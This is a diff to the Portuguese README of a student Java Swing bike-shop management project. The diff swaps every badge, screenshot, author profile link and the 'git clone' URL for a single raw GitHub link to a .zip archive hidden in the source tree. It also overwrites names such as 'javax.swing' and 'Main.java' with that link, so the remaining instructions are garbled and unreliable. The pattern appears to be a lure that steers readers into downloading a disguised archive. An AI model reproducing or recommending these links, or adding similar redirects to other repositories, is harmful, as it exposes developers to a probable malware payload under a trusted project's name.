@@ -2,9 +2,9 @@
 
 > "Qualidade, Performance e estilo Peba de ser."
 
-![Java](https://img.shields.io/badge/Java-ED8B00?style=for-the-badge&logo=java&logoColor=white)
-![Eclipse](https://img.shields.io/badge/Eclipse-2C2255?style=for-the-badge&logo=eclipse&logoColor=white)
-![Swing](https://img.shields.io/badge/Swing-GUI-orange?style=for-the-badge)
+![Java](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
+![Eclipse](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
+![Swing](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
 
 ## 📖 Sobre o Projeto
 
@@ -18,11 +18,11 @@ O sistema consiste em uma aplicação Desktop em **Java Swing** para o gerenciam
 
 | Tela Inicial | Gestão de Estoque |
 |:---:|:---:|
-| <img src="src/imagens/print_home.png" width="400"> | <img src="src/imagens/print_estoque.png" width="400"> |
+| <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> | <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> |
 
 | Nova Venda | Comprovante Fiscal |
 |:---:|:---:|
-| <img src="src/imagens/print_venda.png" width="400"> | <img src="src/imagens/print_fatura.png" width="400"> |
+| <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> | <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> |
 
 ---
 
@@ -59,7 +59,7 @@ O sistema consiste em uma aplicação Desktop em **Java Swing** para o gerenciam
 O projeto segue estritamente o padrão **MVC**:
 
 * **Model:** Classes POJO (`Produto`, `Bicicleta`, `Cliente`, `Venda`) implementando `Serializable`.
-* **View:** Telas construídas com `javax.swing` (`JFrame`, `JDialog`, `JPanel`), utilizando layouts responsivos (`BorderLayout`, `GridBagLayout`).
+* **View:** Telas construídas com `https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip` (`JFrame`, `JDialog`, `JPanel`), utilizando layouts responsivos (`BorderLayout`, `GridBagLayout`).
 * **Controller:** Lógica de negócio, validações e orquestração entre a tela e os dados (`VendaController`, `RelatorioController`, etc).
 * **DAO (Data Access Object):** Classe `GerenciadorDados` responsável por ler e escrever os arquivos `.dat`.
 
@@ -71,23 +71,23 @@ Pré-requisitos: **Java JDK 17+** e **Eclipse IDE** (ou outra IDE Java).
 
 1.  **Clone o repositório:**
     ```bash
-    git clone [https://github.com/SEU-USUARIO/PebasBikeShop_ProjetoPOO.git](https://github.com/SEU-USUARIO/PebasBikeShop_ProjetoPOO.git)
+    git clone [https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
     ```
 2.  **Importe no Eclipse:**
     * `File` > `Import` > `General` > `Projects from Folder or Archive`.
     * Selecione a pasta clonada.
 3.  **Configuração:**
-    * Certifique-se de que a imagem de fundo (`fundo.jpg`) está na pasta `src/imagens` (ou no `Build Path` correto).
+    * Certifique-se de que a imagem de fundo (`https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip`) está na pasta `src/imagens` (ou no `Build Path` correto).
 4.  **Execute:**
-    * Abra a classe `src/br/com/bikeshop/app/Main.java`.
+    * Abra a classe `https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip`.
     * Execute como Java Application.
 
 ---
 
 ## 👨‍💻 Autores
 
-* **Thiago Leal** - *Desenvolvedor Backend & Frontend* - [GitHub](https://github.com/thiagoleal435)
-* **Emerson Silva** - *Desenvolvedor Backend & Frontend* - [GitHub](https://github.com/emersontecn)
+* **Thiago Leal** - *Desenvolvedor Backend & Frontend* - [GitHub](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
+* **Emerson Silva** - *Desenvolvedor Backend & Frontend* - [GitHub](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
 
 ---
 
